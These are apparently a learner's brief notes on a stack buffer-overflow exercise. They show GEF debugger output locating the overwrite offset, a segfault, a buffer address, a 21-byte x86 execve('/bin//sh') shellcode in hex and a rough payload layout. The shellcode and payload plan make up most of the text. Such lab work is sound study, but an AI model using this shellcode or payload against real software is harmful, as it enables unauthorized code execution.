gef➤  pattern offset 0x65616161
[+] Searching for '61616165'/'65616161' with period=4
[+] Found at offset 13 (little-endian search) likely

 stopped 0x65616161 in ?? (), reason: SIGSEGV

- buffer address = 0xffffd2c6
- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- offset = 13 ?

payload = shell code (20 byte) + \n +shell code (1byt) + Offset - 1 + buffer address